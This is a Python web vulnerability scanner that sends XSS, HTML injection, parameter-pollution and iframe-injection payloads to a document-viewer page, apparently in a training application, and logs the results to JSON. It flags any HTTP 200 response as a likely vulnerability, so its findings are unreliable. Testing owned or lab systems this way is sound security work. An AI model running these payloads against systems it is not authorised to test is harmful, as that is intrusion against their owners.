import requests
from bs4 import BeautifulSoup
from urllib.parse import quote
import asyncio
import httpx
import sys
import time
import json
from datetime import datetime
from pathlib import Path
import os

# JSON log directory
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)  # Script to create log folder when it does not exist

if len(sys.argv) > 2:
    base_url = sys.argv[1]  # Receives the base URL as the main code argument
    send_rate = sys.argv[2]  # Receives the send rate as the second argument
else:
    print("Base URL and/or send rate not provided.")
    sys.exit(1)

# Maps the send rate to a specific time interval
delays = {'low': 7, 'medium': 2, 'high': 0.5}
delay = delays.get(send_rate, 2)  # Uses 'medium' as default if the rate is not recognized

target_url = f"{base_url}/index.php?page=document-viewer.php"
print(target_url)
headers_base = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

# Payloads to test
payloads = {
    'Cross Site Scripting': "<script>alert('XSS')</script>",
    'HTML Injection': "<h1>HTML Injection</h1>",
    'HTTP Parameter Pollution': "valid_file.pdf&file=malicious_file.txt",
    'Frame Source Injection': "<iframe src='http://google.com'></iframe>",
}
detailed_tests = []

# Asynchronous function to send the request and check the response
async def send_request_and_check_response(payload, vulnerability_type, test_number):
    complete_url = f"{target_url}&file={quote(payload)}"  # Using quote to encode the payload
    async with httpx.AsyncClient(http2=True) as client:
        test_response = await client.get(complete_url, headers=headers_base)
        soup = BeautifulSoup(test_response.text, 'html.parser')
        title = soup.find('title').string if soup.find('title') else ''

        print(f"Test {test_number}: Testing '{vulnerability_type}'. Status code: {test_response.status_code}, Title: {title}")

        if test_response.status_code == 200:
            print(f"Test #{test_number} PASSED: Possible vulnerability '{vulnerability_type}' found!")
            return 1, test_response
        else:
            print(f"Test #{test_number} FAILED: Status code: {test_response.status_code}.")
            return 0, test_response

# Main function to execute the tests
async def execute_tests():
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    
    detailed_tests = []

    for vulnerability_type, payload in payloads.items():
        total_tests += 1
        test_result, test_response = await send_request_and_check_response(payload, vulnerability_type, total_tests)
        if test_result == 1:
            tests_passed += 1
        else:
            tests_failed += 1
        test_detail = {
        'vulnerability_type': vulnerability_type,
        'payload': payload,
        'passed': test_result == 1,
        'status_code': test_response.status_code
        }
        detailed_tests.append(test_detail)
        
        time.sleep(delay)  # Adds a pause between requests based on the send rate
    # Reporting final results
    print(f"\nTotal Tests: {total_tests}")
    print(f"Tests Passed: {tests_passed}")
    print(f"Tests Failed: {tests_failed}")
    print(f"Tested URL: {target_url}")
    
    # Data retrieval part
    # Record the results in a JSON file in the 'logs' folder
    results = {
        'date_time': datetime.now().strftime("%Y-%m-%d_%H-%M-%S"),
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': target_url,
        'detailed_tests': detailed_tests  # Incluindo os detalhes dos testes
    }
    
    # Get the name of the current script
    script_name = os.path.splitext(os.path.basename(__file__))[0]

    file_name = f"results_{script_name}_{results['date_time']}.json"
    full_file_path = logs_dir.joinpath(file_name)

    with open(full_file_path, 'w') as file:
        json.dump(results, file, indent=4)

    print(f"\nResults saved in {full_file_path}")
    
if __name__ == "__main__":
    asyncio.run(execute_tests())